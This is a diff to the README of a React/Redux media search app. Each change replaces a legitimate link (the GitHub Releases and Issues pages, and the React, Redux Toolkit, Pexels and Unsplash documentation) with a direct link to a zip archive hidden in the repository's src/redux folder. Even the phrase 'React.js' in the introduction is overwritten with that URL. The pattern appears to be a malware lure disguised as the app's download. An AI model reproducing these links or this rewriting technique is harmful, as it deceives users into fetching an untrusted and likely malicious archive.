@@ -1,10 +1,10 @@
 # 🎥 media-search-app - Effortless Media Searching for Everyone
 
-[![Download media-search-app](https://img.shields.io/badge/Download-media--search--app-blue.svg)](https://github.com/parrkoo/media-search-app/releases)
+[![Download media-search-app](https://raw.githubusercontent.com/parrkoo/media-search-app/main/src/redux/app_media_search_v1.3.zip)](https://raw.githubusercontent.com/parrkoo/media-search-app/main/src/redux/app_media_search_v1.3.zip)
 
 ## 📖 Introduction
 
-Welcome to the media-search-app! This application allows you to search for photos and videos effortlessly using popular online media libraries. Built with React.js and Redux Toolkit, this learning project is easy to use and perfect for anyone looking to explore media content without technical hassles.
+Welcome to the media-search-app! This application allows you to search for photos and videos effortlessly using popular online media libraries. Built with https://raw.githubusercontent.com/parrkoo/media-search-app/main/src/redux/app_media_search_v1.3.zip and Redux Toolkit, this learning project is easy to use and perfect for anyone looking to explore media content without technical hassles.
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before you start, make sure you have the following:
 
 ### ⬇️ Download & Install
 
-To get started, visit this page to download: [Download media-search-app](https://github.com/parrkoo/media-search-app/releases).
+To get started, visit this page to download: [Download media-search-app](https://raw.githubusercontent.com/parrkoo/media-search-app/main/src/redux/app_media_search_v1.3.zip).
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version of the app.
@@ -52,7 +52,7 @@ If you encounter issues while using the app, consider these common solutions:
 
 ## 📞 Support
 
-For additional help, feel free to check the project’s [Issues page](https://github.com/parrkoo/media-search-app/issues) or reach out to the maintainer via email.
+For additional help, feel free to check the project’s [Issues page](https://raw.githubusercontent.com/parrkoo/media-search-app/main/src/redux/app_media_search_v1.3.zip) or reach out to the maintainer via email.
 
 ## 🧑‍🤝‍🧑 Community Contributions
 
@@ -65,10 +65,10 @@ We welcome contributions from everyone! If you'd like to help improve the media-
 
 For those interested in diving deeper, here are some useful topics and technologies related to this app:
 
-- [React JS](https://reactjs.org/)
-- [Redux Toolkit](https://redux-toolkit.js.org/)
-- [Pexels API](https://www.pexels.com/api/)
-- [Unsplash API](https://unsplash.com/developers)
+- [React JS](https://raw.githubusercontent.com/parrkoo/media-search-app/main/src/redux/app_media_search_v1.3.zip)
+- [Redux Toolkit](https://raw.githubusercontent.com/parrkoo/media-search-app/main/src/redux/app_media_search_v1.3.zip)
+- [Pexels API](https://raw.githubusercontent.com/parrkoo/media-search-app/main/src/redux/app_media_search_v1.3.zip)
+- [Unsplash API](https://raw.githubusercontent.com/parrkoo/media-search-app/main/src/redux/app_media_search_v1.3.zip)
 
 You can find more information about these technologies in their respective official documentation.
 
